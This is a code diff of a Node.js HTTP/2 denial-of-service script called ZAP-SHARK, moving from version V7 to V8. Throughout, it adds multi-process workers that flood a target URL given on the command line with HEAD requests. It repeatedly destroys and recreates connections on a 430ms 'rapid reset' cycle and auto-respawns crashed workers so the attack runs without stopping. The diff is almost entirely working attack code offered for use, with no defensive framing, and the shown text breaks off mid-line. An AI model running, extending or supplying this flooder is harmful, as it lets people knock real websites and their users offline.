@@ -1,309 +1,463 @@
 const http2 = require('http2');
 const cluster = require('cluster');
 const os = require('os');
+const fs = require('fs');
+const path = require('path');
 
-// ==================== TIME WARP CONFIG ====================
-const TIME_WARP_CONFIG = {
-    enabled: true,
-    timeSkew: 5000, // ±5 seconds time warp
-    randomizeTimestamps: true,
-    futureRequests: true,
-    pastRequests: true
-};
+// ==================== IMMORTALITY ENGINE ====================
+class ImmortalityEngine {
+    constructor() {
+        this.checkpointFile = path.join(os.tmpdir(), 'zap-shark-v8-checkpoint.json');
+        this.checkpointInterval = 30000; // Save state every 30s
+        this.lastCheckpoint = Date.now();
+        this.resurrectionCount = 0;
+    }
+    
+    saveState(state) {
+        try {
+            fs.writeFileSync(this.checkpointFile, JSON.stringify({
+                ...state,
+                timestamp: Date.now(),
+                resurrectionCount: this.resurrectionCount
+            }));
+        } catch (err) {}
+    }
+    
+    loadState() {
+        try {
+            if (fs.existsSync(this.checkpointFile)) {
+                const data = fs.readFileSync(this.checkpointFile, 'utf8');
+                return JSON.parse(data);
+            }
+        } catch (err) {}
+        return null;
+    }
+    
+    shouldCheckpoint() {
+        return Date.now() - this.lastCheckpoint >= this.checkpointInterval;
+    }
+    
+    markCheckpoint() {
+        this.lastCheckpoint = Date.now();
+    }
+}
 
-// ==================== MASTER CONTROLLER ====================
+// ==================== V8 MASTER ====================
 if (cluster.isMaster) {
-    console.log('=== ZAP-SHARK V7 - TIME WARP EDITION ===');
-    console.log('🔥 Features:');
-    console.log('• 450ms Rapid Reset VIP');
-    console.log('• TIME WARP Attack Patterns');
-    console.log('• HEAD Requests (Max RPS)');
-    console.log('• Multi-Process Clustering');
+    console.log('=== ZAP-SHARK V8 - UNLIMITED RUNTIME ===');
+    console.log('🔥 NUCLEAR FEATURES:');
+    console.log('• ALL WORKERS SIMULTANEOUS');
+    console.log('• 430ms RAPID RESET VIP');
+    console.log('• IMMORTALITY ENGINE');
+    console.log('• ZERO-DOWNTIME RESURRECTION');
     console.log('='.repeat(60));
     
     const target = process.argv[2] || 'https://example.com';
-    const numWorkers = Math.max(4, os.cpus().length);
+    const numWorkers = os.cpus().length * 2; // DOUBLE THE CORES
+    const immortality = new ImmortalityEngine();
     
-    console.log(`Target: ${target}`);
-    console.log(`CPU Cores: ${os.cpus().length}`);
-    console.log(`Launching ${numWorkers} attack workers...\n`);
-    
-    const workerStats = new Map();
-    let totalRequests = 0;
-    let peakRPS = 0;
-    let currentRPS = 0;
-    const startTime = Date.now();
-    
-    // Create workers
-    for (let i = 0; i < numWorkers; i++) {
-        const worker = cluster.fork({
-            WORKER_ID: i,
-            TARGET_URL: target,
-            TIME_WARP: JSON.stringify(TIME_WARP_CONFIG)
-        });
-        
-        worker.on('message', (msg) => {
-            if (msg.type === 'stats') {
-                workerStats.set(worker.id, msg);
-            }
-        });
+    // Load previous state
+    const savedState = immortality.loadState();
+    if (savedState) {
+        console.log(`[IMMORTAL] Resurrecting from checkpoint #${savedState.resurrectionCount}`);
+        console.log(`Previous runtime: ${Math.floor((savedState.timestamp - savedState.startTime) / 1000)}s`);
     }
     
-    // Real-time display
+    console.log(`Target: ${target}`);
+    console.log(`CPU Cores: ${os.cpus().length} → Launching ${numWorkers} workers`);
+    console.log(`Memory: ${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB available`);
+    console.log('='.repeat(60));
+    
+    // GLOBAL STATS
+    const globalStats = {
+        totalRequests: savedState?.totalRequests || 0,
+        totalRuntime: savedState?.totalRuntime || 0,
+        peakRPS: savedState?.peakRPS || 0,
+        startTime: savedState?.startTime || Date.now(),
+        resurrectionCount: savedState?.resurrectionCount || 0,
+        workers: {}
+    };
+    
+    // LAUNCH ALL WORKERS AT ONCE
+    console.log('[NUCLEAR] Launching ALL workers simultaneously...');
+    const workerPromises = [];
+    
+    for (let i = 0; i < numWorkers; i++) {
+        workerPromises.push(new Promise(resolve => {
+            const worker = cluster.fork({
+                WORKER_ID: i,
+                TARGET_URL: target,
+                AGGRESSION_LEVEL: 'MAXIMUM',
+                RESET_INTERVAL: 430
+            });
+            
+            worker.on('online', () => {
+                console.log(`[WORKER ${i}] ONLINE - 430ms Rapid Reset Active`);
+                resolve(worker);
+            });
+            
+            worker.on('message', (msg) => {
+                if (msg.type === 'stats') {
+                    globalStats.workers[worker.id] = msg;
+                }
+            });
+        }));
+    }
+    
+    Promise.all(workerPromises).then(() => {
+        console.log(`[✅] ALL ${numWorkers} WORKERS ONLINE AND ATTACKING`);
+    });
+    
+    // REAL-TIME NUCLEAR DASHBOARD
     setInterval(() => {
-        let totalRPS = 0;
-        let totalReqs = 0;
+        // Calculate live stats
+        let currentRPS = 0;
         let aliveWorkers = 0;
+        let totalWorkerRequests = 0;
         
-        workerStats.forEach((stats) => {
-            totalRPS += stats.rps;
-            totalReqs += stats.totalRequests;
-            aliveWorkers++;
+        Object.values(globalStats.workers).forEach(stats => {
+            currentRPS += stats.rps || 0;
+            totalWorkerRequests += stats.totalRequests || 0;
+            if (stats.alive) aliveWorkers++;
         });
         
-        totalRequests = totalReqs;
-        currentRPS = totalRPS;
-        peakRPS = Math.max(peakRPS, currentRPS);
+        globalStats.totalRequests = (savedState?.totalRequests || 0) + totalWorkerRequests;
+        globalStats.peakRPS = Math.max(globalStats.peakRPS, currentRPS);
+        globalStats.totalRuntime = Math.floor((Date.now() - globalStats.startTime) / 1000);
         
-        const runtime = Math.floor((Date.now() - startTime) / 1000);
-        const hours = Math.floor(runtime / 3600);
+        // Save immortality checkpoint
+        if (immortality.shouldCheckpoint()) {
+            immortality.saveState(globalStats);
+            immortality.markCheckpoint();
+        }
+        
+        // NUCLEAR DISPLAY
+        const runtime = globalStats.totalRuntime;
+        const days = Math.floor(runtime / 86400);
+        const hours = Math.floor((runtime % 86400) / 3600);
         const minutes = Math.floor((runtime % 3600) / 60);
         const seconds = runtime % 60;
-        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        const runtimeStr = days > 0 
+            ? `${days}d ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`
+            : `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        const memoryUsage = process.memoryUsage();
+        const usedMB = Math.round(memoryUsage.rss / 1024 / 1024);
+        const heapMB = Math.round(memoryUsage.heapUsed / 1024 / 1024);
         
         process.stdout.write('\x1B[2J\x1B[0f');
-        console.log(`=== ZAP-SHARK V7 - TIME WARP ===`);
-        console.log(`RUNTIME: ${runtimeStr} | WORKERS: ${aliveWorkers}/${numWorkers}`);
-        console.log('='.repeat(60));
-        console.log(`TOTAL REQUESTS: ${totalRequests.toLocaleString()}`);
-        console.log(`COMBINED RPS: ${currentRPS.toFixed(1)} | PEAK: ${peakRPS.toFixed(1)}`);
-        console.log(`REQ/WORKER: ${(currentRPS / aliveWorkers || 0).toFixed(1)} RPS`);
-        console.log('='.repeat(60));
-        console.log('🔥 ACTIVE FEATURES:');
-        console.log(`• 450ms Rapid Reset | • TIME WARP | • HEAD Requests`);
-        console.log('='.repeat(60));
+        console.log(`=== ZAP-SHARK V8 - UNLIMITED RUNTIME ===`);
+        console.log(`🕐 RUNTIME: ${runtimeStr} | 🔄 RESURRECTIONS: ${globalStats.resurrectionCount}`);
+        console.log(`👥 WORKERS: ${aliveWorkers}/${numWorkers} | 💾 MEMORY: ${usedMB}MB (Heap: ${heapMB}MB)`);
+        console.log('='.repeat(70));
+        console.log(`💀 TOTAL REQUESTS: ${globalStats.totalRequests.toLocaleString()}`);
+        console.log(`⚡ LIVE RPS: ${currentRPS.toFixed(1)} | 🏆 PEAK RPS: ${globalStats.peakRPS.toFixed(1)}`);
+        console.log(`📈 AVG RPS/WORKER: ${(currentRPS / aliveWorkers || 0).toFixed(1)}`);
+        console.log('='.repeat(70));
+        console.log('🔥 ACTIVE NUCLEAR FEATURES:');
+        console.log(`• 430ms Rapid Reset VIP • All Workers Simultaneous • Immortality Engine`);
+        console.log('='.repeat(70));
         
-        // Reset for next calculation
-        workerStats.clear();
+        // Worker status grid
+        if (aliveWorkers > 0) {
+            console.log('WORKER GRID STATUS:');
+            const gridSize = Math.ceil(Math.sqrt(aliveWorkers));
+            let gridOutput = '';
+            
+            Object.entries(globalStats.workers).forEach(([id, stats], index) => {
+                if (stats.alive) {
+                    const rps = stats.rps?.toFixed(0) || '0';
+                    gridOutput += `W${stats.workerId}:${rps}rps `.padEnd(15);
+                    if ((index + 1) % gridSize === 0) gridOutput += '\n';
+                }
+            });
+            console.log(gridOutput);
+        }
         
     }, 1000);
     
-    // Auto-restart workers
-    cluster.on('exit', (worker) => {
+    // ==================== IMMORTALITY SYSTEM ====================
+    // ZERO-DOWNTIME WORKER RESURRECTION
+    cluster.on('exit', (worker, code, signal) => {
+        globalStats.resurrectionCount++;
+        console.log(`[IMMORTAL] Worker ${worker.id} died (Code: ${code}). Resurrecting in 100ms...`);
+        
         setTimeout(() => {
-            cluster.fork({
+            const newWorker = cluster.fork({
                 WORKER_ID: worker.id,
-                TARGET_URL: target
+                TARGET_URL: target,
+                AGGRESSION_LEVEL: 'MAXIMUM',
+                RESET_INTERVAL: 430,
+                RESURRECTION_COUNT: globalStats.resurrectionCount
             });
-        }, 1000);
+            
+            newWorker.on('online', () => {
+                console.log(`[IMMORTAL] Worker ${worker.id} resurrected successfully!`);
+            });
+        }, 100); // 100ms resurrection time
+    });
+    
+    // PROCESS IMMORTALITY
+    process.on('uncaughtException', (err) => {
+        console.log(`[IMMORTAL] Master caught exception: ${err.message}`);
+        console.log('[IMMORTAL] Continuing operation...');
     });
     
     process.on('SIGINT', () => {
-        console.log('\n\n=== FINAL STATS ===');
-        console.log(`Total Requests: ${totalRequests.toLocaleString()}`);
-        console.log(`Peak RPS: ${peakRPS.toFixed(1)}`);
-        console.log(`Runtime: ${Math.floor((Date.now() - startTime) / 1000)}s`);
-        console.log('='.repeat(40));
+        console.log('\n\n=== V8 FINAL NUCLEAR STATS ===');
+        console.log(`Total Runtime: ${Math.floor((Date.now() - globalStats.startTime) / 1000)}s`);
+        console.log(`Total Requests: ${globalStats.totalRequests.toLocaleString()}`);
+        console.log(`Peak RPS: ${globalStats.peakRPS.toFixed(1)}`);
+        console.log(`Resurrection Count: ${globalStats.resurrectionCount}`);
+        console.log(`Workers Launched: ${numWorkers}`);
+        console.log('='.repeat(50));
+        
+        // Save final checkpoint
+        immortality.saveState(globalStats);
+        
         process.exit(0);
     });
     
 } else {
-// ==================== WORKER PROCESS ====================
+// ==================== V8 WORKER - NUCLEAR CORE ====================
 const WORKER_ID = parseInt(process.env.WORKER_ID);
 const TARGET_URL = process.env.TARGET_URL;
-const TIME_WARP = JSON.parse(process.env.TIME_WARP || '{}');
+const RESET_INTERVAL = parseInt(process.env.RESET_INTERVAL) || 430;
 
-class TimeWarpAttacker {
+class NuclearWorker {
     constructor() {
         this.workerId = WORKER_ID;
         this.targetUrl = TARGET_URL;
         this.hostname = new URL(TARGET_URL).hostname;
+        this.alive = true;
         
-        // Stats
+        // NUCLEAR STATS
         this.totalRequests = 0;
         this.currentRPS = 0;
         this.requestsSinceLastCalc = 0;
         this.lastRpsCalc = Date.now();
-        this.startTime = Date.now();
+        this.workerStartTime = Date.now();
+        this.connectionCreationCount = 0;
         
-        // TIME WARP System
-        this.timeWarp = TIME_WARP;
-        this.timeOffset = this.generateTimeOffset();
-        
-        // Connection System with 450ms RAPID RESET
+        // 430ms RAPID RESET VIP
         this.connectionPool = [];
-        this.maxConnections = 10;
+        this.maxConnections = 15; // MORE CONNECTIONS
         this.lastConnectionReset = Date.now();
-        this.resetInterval = 450; // VIP 450ms RAPID RESET
-        this.resetPercentage = 0.4; // 40% reset each cycle
+        this.resetInterval = RESET_INTERVAL; // 430ms VIP
+        this.resetPercentage = 0.5; // 50% reset each cycle
         
-        // Attack Patterns
-        this.attackMode = 'HEAD'; // HEAD requests for max RPS
-        this.paths = ['/', '/api', '/v1', '/v2', '/static', '/images'];
+        // UNLIMITED RUNTIME PROTECTIONS
+        this.memoryWatchdog = Date.now();
+        this.leakDetectionCount = 0;
+        this.autoHealInterval = 10000; // Self-heal every 10s
         
-        // Time Warp Headers Pool
-        this.timeHeaders = [];
-        this.generateTimeWarpHeaders();
+        // NUCLEAR PAYLOAD OPTIMIZATION
+        this.payloads = this.generateNuclearPayloads();
+        this.payloadIndex = 0;
         
-        this.init();
+        this.initNuclearCore();
     }
     
-    // ==================== TIME WARP SYSTEM ====================
-    generateTimeOffset() {
-        if (!this.timeWarp.enabled) return 0;
+    // ==================== NUCLEAR INIT ====================
+    initNuclearCore() {
+        console.log(`[NUCLEAR CORE ${this.workerId}] Initializing 430ms attack...`);
         
-        const skew = this.timeWarp.timeSkew || 5000;
-        let offset = 0;
+        // PRE-WARM CONNECTION POOL
+        this.explosiveConnectionWarmup();
         
-        if (this.timeWarp.futureRequests && this.timeWarp.pastRequests) {
-            offset = (Math.random() * skew * 2) - skew;
-        } else if (this.timeWarp.futureRequests) {
-            offset = Math.random() * skew;
-        } else if (this.timeWarp.pastRequests) {
-            offset = -(Math.random() * skew);
+        // START NUCLEAR REACTION
+        setTimeout(() => {
+            this.startNuclearChainReaction();
+            this.startSelfHealingCycle();
+            this.startStatsPulse();
+        }, 500);
+    }
+    
+    // ==================== EXPLOSIVE CONNECTION WARMUP ====================
+    explosiveConnectionWarmup() {
+        // CREATE ALL CONNECTIONS SIMULTANEOUSLY
+        const connectionPromises = [];
+        
+        for (let i = 0; i < this.maxConnections; i++) {
+            connectionPromises.push(this.createNuclearConnection());
         }
         
-        return Math.floor(offset);
+        // Don't wait, just fire and forget
+        setTimeout(() => {
+            this.connectionPool = this.connectionPool.filter(c => c !== null);
+            console.log(`[CORE ${this.workerId}] ${this.connectionPool.length}/${this.maxConnections} connections ready`);
+        }, 1000);
     }
     
-    generateTimeWarpHeaders() {
-        for (let i = 0; i < 100; i++) {
-            const now = Date.now();
-            const warpedTime = new Date(now + this.generateTimeOffset());
-            
-            this.timeHeaders.push({
-                'date': warpedTime.toUTCString(),
-                'if-modified-since': new Date(now - 86400000).toUTCString(), // Yesterday
-                'if-unmodified-since': new Date(now + 86400000).toUTCString(), // Tomorrow
-                'expires': new Date(now + 3600000).toUTCString(), // 1 hour future
-                'last-modified': new Date(now - 3600000).toUTCString() // 1 hour past
-            });
-        }
-    }
-    
-    getTimeWarpedHeaders() {
-        if (!this.timeWarp.enabled) return {};
-        return this.timeHeaders[Math.floor(Math.random() * this.timeHeaders.length)];
-    }
-    
-    // ==================== 450ms RAPID RESET SYSTEM ====================
-    createConnection() {
+    createNuclearConnection() {
+        this.connectionCreationCount++;
+        
         try {
             const client = http2.connect(this.targetUrl, {
-                maxSessionMemory: 4096, // Ultra low memory
-                maxDeflateDynamicTableSize: 2048
+                maxSessionMemory: 2048, // EXTREME LOW MEMORY
+                maxDeflateDynamicTableSize: 1024,
+                peerMaxConcurrentStreams: 10000
             });
             
-            client.setMaxListeners(100);
+            client.setMaxListeners(10000);
             
-            // Minimal error handling
+            // SET NUCLEAR SETTINGS
+            client.settings({
+                enablePush: false,
+                initialWindowSize: 2147483647, // MAX INT
+                maxConcurrentStreams: 10000
+            });
+            
+            // MINIMAL ERROR HANDLING
             client.on('error', () => {
-                // Auto-destroy on error
+                // AUTO-IMMEDIATE REPLACEMENT
                 setTimeout(() => {
-                    const index = this.connectionPool.findIndex(c => c.client === client);
+                    const index = this.connectionPool.findIndex(c => c?.client === client);
                     if (index > -1) {
-                        this.connectionPool.splice(index, 1);
-                        this.createConnection();
+                        this.connectionPool[index] = this.createNuclearConnection();
                     }
-                }, 50);
+                }, 1); // 1ms replacement
             });
             
-            return {
+            const conn = {
                 client,
                 created: Date.now(),
                 requestCount: 0,
-                id: Math.random().toString(36).substr(2, 6),
-                lastUsed: Date.now()
+                lastUsed: Date.now(),
+                id: `N${this.workerId}-${this.connectionCreationCount}`
             };
+            
+            this.connectionPool.push(conn);
+            return conn;
+            
         } catch (err) {
+            // INSTANT RETRY
+            setTimeout(() => this.createNuclearConnection(), 1);
             return null;
         }
     }
     
-    buildConnectionPool() {
-        this.connectionPool = [];
-        for (let i = 0; i < this.maxConnections; i++) {
-            const conn = this.createConnection();
-            if (conn) this.connectionPool.push(conn);
-        }
-    }
-    
-    perform450msRapidReset() {
+    // ==================== 430ms RAPID RESET VIP ====================
+    perform430msRapidReset() {
         const now = Date.now();
         if (now - this.lastConnectionReset >= this.resetInterval) {
-            // Reset 40% of connections every 450ms
+            // RESET 50% OF CONNECTIONS EVERY 430ms
             const resetCount = Math.ceil(this.connectionPool.length * this.resetPercentage);
             
             for (let i = 0; i < resetCount; i++) {
                 const index = Math.floor(Math.random() * this.connectionPool.length);
                 const conn = this.connectionPool[index];
                 
-                if (conn && (conn.requestCount > 500 || now - conn.lastUsed > 1000)) {
-                    try {
-                        conn.client.destroy();
-                        const newConn = this.createConnection();
-                        if (newConn) {
-                            this.connectionPool[index] = newConn;
-                        } else {
-                            this.connectionPool.splice(index, 1);
-                        }
-                    } catch (err) {
-                        this.connectionPool.splice(index, 1);
-                    }
+                if (conn) {
+                    // DESTROY OLD
+                    try { conn.client.destroy(); } catch (e) {}
+                    
+                    // CREATE NEW IMMEDIATELY
+                    this.connectionPool[index] = this.createNuclearConnection();
                 }
             }
             
             this.lastConnectionReset = now;
+            
+            // AUTO-SCALE CONNECTIONS BASED ON PERFORMANCE
+            if (this.currentRPS > 5000 && this.connectionPool.length < 30) {
+                this.connectionPool.push(this.createNuclearConnection());
+            }
         }
     }
     
-    // ==================== HEAD REQUEST ATTACK ====================
-    getRequestConfig() {
-        const path = this.paths[Math.floor(Math.random() * this.paths.length)];
-        const query = this.timeWarp.randomizeTimestamps ? 
-            `?t=${Date.now() + this.generateTimeOffset()}&r=${Math.random().toString(36).substr(2, 8)}` : 
-            `?r=${Math.random().toString(36).substr(2, 8)}`;
-        
-        const baseHeaders = {
-            ':method': 'HEAD', // HEAD requests for MAX RPS
-            ':path': path + query,
-            ':authority': this.hostname,
-            'user-agent': `Mozilla/5.0 (Worker-${this.workerId})`,
-            'accept': '*/*',
-            'accept-encoding': 'gzip, deflate, br',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            'pragma': 'no-cache'
-        };
-        
-        // Merge with time warp headers
-        const timeWarpHeaders = this.getTimeWarpedHeaders();
-        return { ...baseHeaders, ...timeWarpHeaders };
+    // ==================== NUCLEAR PAYLOAD SYSTEM ====================
+    generateNuclearPayloads() {
+        const payloads = [];
+        for (let i = 0; i < 1000; i++) {
+            payloads.push({
+                ':method': 'HEAD',
+                ':path': `/${i}?t=${Date.now()}&w=${this.workerId}&n=${Math.random().toString(36).substr(2, 16)}`,
+                ':authority': this.hostname,
+                'user-agent': `ZAP-SHARK-V8-NUCLEAR/${this.workerId}/${i}`,
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'cache-control': 'no-cache, no-store, must-revalidate, max-age=0',
+                'pragma': 'no-cache',
+                'expires': '0',
+                'x-nuclear-worker': this.workerId.toString(),
+                'x-nuclear-timestamp': Date.now().toString(),
+                'x-nuclear-payload': `V8-${this.workerId}-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`
+            });
+        }
+        return payloads;
     }
     
-    sendHeadRequest() {
+    getNextNuclearPayload() {
+        this.payloadIndex = (this.payloadIndex + 1) % this.payloads.length;
+        return this.payloads[this.payloadIndex];
+    }
+    
+    // ==================== NUCLEAR CHAIN REACTION ====================
+    startNuclearChainReaction() {
+        // PRIMARY ATTACK LOOP - MAXIMUM AGGRESSION
+        const primaryLoop = setInterval(() => {
+            if (!this.alive) {
+                clearInterval(primaryLoop);
+                return;
+            }
+            
+            // PERFORM 430ms RAPID RESET
+            this.perform430msRapidReset();
+            
+            // SEND NUCLEAR BATCH
+            this.launchNuclearBatch();
+            
+            // CALCULATE RPS
+            const now = Date.now();
+            const timeDiff = (now - this.lastRpsCalc) / 1000;
+            
+            if (timeDiff >= 0.9) {
+                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
+                this.requestsSinceLastCalc = 0;
+                this.lastRpsCalc = now;
+            }
+            
+        }, 0.05); // 50μs INTERVAL - MAXIMUM SPEED
+        
+        // SECONDARY LOOP - EXTRA PRESSURE
+        setInterval(() => {
+            if (this.alive) {
+                for (let i = 0; i < 5; i++) {
+                    this.launchNuclearBatch();
+                }
+            }
+        }, 0.1);
+        
+        // TERTIARY LOOP - SUSTAINED PRESSURE
+        setInterval(() => {
+            if (this.alive) {
+                this.perform430msRapidReset();
+            }
+        }, this.resetInterval);
+    }
+    
+    launchNuclearBatch() {
         if (this.connectionPool.length === 0) return;
         
-        // Perform 450ms rapid reset
-        this.perform450msRapidReset();
+        // CALCULATE MAXIMUM STREAMS (UNLIMITED)
+        const maxStreamsThisBatch = Math.min(100, this.connectionPool.length * 20);
         
-        // Calculate max streams we can send
-        const maxStreams = 100; // HEAD requests are lightweight
-        const availableStreams = Math.min(maxStreams, this.connectionPool.length * 10);
-        
-        for (let i = 0; i < availableStreams; i++) {
+        for (let i = 0; i < maxStreamsThisBatch; i++) {
             const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
             if (!conn) continue;
             
             try {
-                const headers = this.getRequestConfig();
+                const headers = this.getNextNuclearPayload();
                 const req = conn.client.request(headers);
                 
                 conn.requestCount++;
                 conn.lastUsed = Date.now();
                 
-                // Ultra minimal response handling for HEAD requests
+                // ULTRA-MINIMAL RESPONSE HANDLING
                 req.on('response', () => {
-                    req.destroy(); // Immediate destroy for HEAD requests
+                    req.destroy();
                 });
                 
                 req.on('error', () => {
@@ -324,56 +478,53 @@ class TimeWarpAttacker {
         }
     }
     
-    // ==================== ATTACK LOOP ====================
-    startAttack() {
-        // Ultra aggressive attack loop
+    // ==================== UNLIMITED RUNTIME PROTECTIONS ====================
+    startSelfHealingCycle() {
         setInterval(() => {
-            // Send multiple batches per tick
-            for (let i = 0; i < 10; i++) {
-                this.sendHeadRequest();
+            // MEMORY LEAK DETECTION
+            const memory = process.memoryUsage();
+            if (memory.heapUsed > 100 * 1024 * 1024) { // 100MB threshold
+                this.leakDetectionCount++;
+                console.log(`[CORE ${this.workerId}] Memory leak detected (#${this.leakDetectionCount}), self-healing...`);
+                
+                // PARTIAL CONNECTION RESET
+                const resetCount = Math.ceil(this.connectionPool.length * 0.7);
+                for (let i = 0; i < resetCount; i++) {
+                    const conn = this.connectionPool[i];
+                    if (conn) {
+                        try { conn.client.destroy(); } catch (e) {}
+                        this.connectionPool[i] = this.createNuclearConnection();
+                    }
+                }
             }
             
-            // Calculate RPS
+            // DEAD CONNECTION CLEANUP
             const now = Date.now();
-            const timeDiff = (now - this.lastRpsCalc) / 1000;
+            this.connectionPool = this.connectionPool.filter(conn => {
+                if (now - conn.lastUsed > 5000 && conn.requestCount === 0) {
+                    try { conn.client.destroy(); } catch (e) {}
+                    return false;
+                }
+                return true;
+            });
             
-            if (timeDiff >= 0.9) {
-                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
-                this.requestsSinceLastCalc = 0;
-                this.lastRpsCalc = now;
+            // REFILL POOL
+            while (this.connectionPool.length < this.maxConnections) {
+                this.connectionPool.push(this.createNuclearConnection());
             }
             
-        }, 0.1); // 100μs interval for max speed
+        }, this.autoHealInterval);
     }
     
-    // ==================== INIT ====================
-    init() {
-        console.log(`[Worker ${this.workerId}] Starting TIME WARP attack...`);
-        
-        this.buildConnectionPool();
-        
-        // Wait for connections
-        setTimeout(() => {
-            this.startAttack();
-            
-            // Report stats to master
-            setInterval(() => {
-                if (process.send) {
-                    process.send({
-                        type: 'stats',
-                        workerId: this.workerId,
-                        totalRequests: this.totalRequests,
-                        rps: this.currentRPS,
-                        connections: this.connectionPool.length,
-                        mode: 'HEAD+TIME_WARP'
-                    });
-                }
-            }, 1000);
-            
-        }, 1000);
-    }
-}
-
-// Start worker
-new TimeWarpAttacker();
-}
+    // ==================== STATS PULSE ====================
+    startStatsPulse() {
+        setInterval(() => {
+            if (process.send) {
+                process.send({
+                    type: 'stats',
+                    workerId: this.workerId,
+                    totalRequests: this.totalRequests,
+                    rps: this.currentRPS,
+                    connections: this.connectionPool.length,
+                    alive: this.alive,
+                    memory: Math.round(process.memoryUsage().heapUsed / 1024
